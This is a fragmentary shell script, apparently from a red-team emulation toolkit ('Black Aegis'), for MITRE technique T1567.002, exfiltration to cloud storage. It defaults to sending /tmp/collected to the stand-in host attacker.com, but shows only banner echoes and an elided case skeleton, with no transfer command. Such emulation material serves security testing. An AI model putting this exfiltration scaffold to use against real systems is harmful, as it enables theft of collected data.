...
# Technique: T1567.002 - Exfiltration to Cloud Storage (T1567.002)
# WARNING: Authorized testing only.

DATA="${1:-/tmp/collected}"
SERVER="${2:-attacker.com}"

echo "[*] Black Aegis - T1567.002 Exfiltration"
echo "[*] Data: $DATA"
echo "[*] Server: $SERVER"
...
case "T1567.002" in
    ...
    T1567.001)
        ...
        ;;
    *)
        echo "[+] Exfiltration via Exfiltration to Cloud Storage (T1567.002)"
